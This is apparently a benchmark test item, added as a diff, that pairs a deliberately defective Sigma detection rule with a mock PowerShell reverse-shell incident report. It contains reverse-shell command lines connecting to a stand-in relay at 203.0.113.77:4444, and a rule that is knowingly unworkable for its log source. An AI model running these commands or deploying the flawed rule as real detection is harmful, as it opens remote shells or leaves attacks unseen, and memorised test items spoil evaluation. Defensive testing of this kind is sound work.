@@ -1,0 +1,110 @@
+id: D5-04
+role: defective
+defect_class: D5
+evasive: true
+why: 'The rule claims the available category network_connection and adds only the boolean Initiated field,
+  but its sole discriminating condition is ScriptBlockText, which is produced only by PowerShell script
+  block logging (windows_powershell_script_block, available: false); the opportunity requires that source,
+  so the rule cannot work on the laboratory''s network telemetry.'
+expected_gate: G6
+report_text: 'Our incident response team reconstructed an interactive PowerShell reverse shell on a developer
+  build server. The initial command line was wrapped in an encoded command, but script block logging (event
+  4104) captured the decoded socket code. The script opened a raw TCP socket to the operator''s relay
+  and wrapped the stream in a reader and writer loop. The key line read: $client = New-Object System.Net.Sockets.TCPClient(''203.0.113.77'',4444).
+  The relay at 203.0.113.77 listened on TCP 4444, a non-standard port for this environment, and answered
+  every session with a simple prompt string. The operator ran host discovery and then pulled additional
+  tooling through the same channel. Because the destination and port were assembled inside the script,
+  the decoded script block is the most reliable place to see the relay address, ahead of any network-layer
+  record.'
+evidence:
+- $client = New-Object System.Net.Sockets.TCPClient('203.0.113.77',4444)
+- The relay at 203.0.113.77 listened on TCP 4444, a non-standard port for this environment
+logsource: windows_powershell_script_block
+techniques:
+- T1059.001
+- T1571
+sigma_yaml: |
+  title: PowerShell Reverse Shell Using TCPClient To Known Relay
+  id: 9a05f3d8-61b2-4e7c-a4d9-0f58b2e71c44
+  status: experimental
+  description: Detects an outbound connection from a PowerShell reverse shell that builds a System.Net.Sockets.TCPClient to the relay address named in the report.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.execution
+    - attack.t1059.001
+    - attack.command_and_control
+    - attack.t1571
+  logsource:
+    category: network_connection
+    product: windows
+  detection:
+    selection_net:
+      Initiated: true
+    selection_script:
+      ScriptBlockText|contains|all:
+        - System.Net.Sockets.TCPClient
+        - '203.0.113.77'
+    condition: selection_net and selection_script
+  falsepositives:
+    - Network diagnostic scripts that test connectivity to the same relay address
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -Command "$client = New-Object System.Net.Sockets.TCPClient('203.0.113.77',4444);
+      $stream = $client.GetStream()"
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\build-svc
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('203.0.113.77',4444);
+      while($true){Start-Sleep 5}"
+    parent: C:\Windows\System32\wbem\WmiPrvSE.exe
+    parent_cmd: C:\Windows\System32\wbem\WmiPrvSE.exe -secured -Embedding
+    user: LAB\build-svc
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\ipconfig.exe
+    cmd: ipconfig /all
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\ivan
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\notepad.exe
+    cmd: notepad.exe build-notes.txt
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\ivan
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -Command "$c = New-Object System.Net.Sockets.TCPClient('192.0.2.15',443);
+      $c.Close()"
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\netops-judy
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
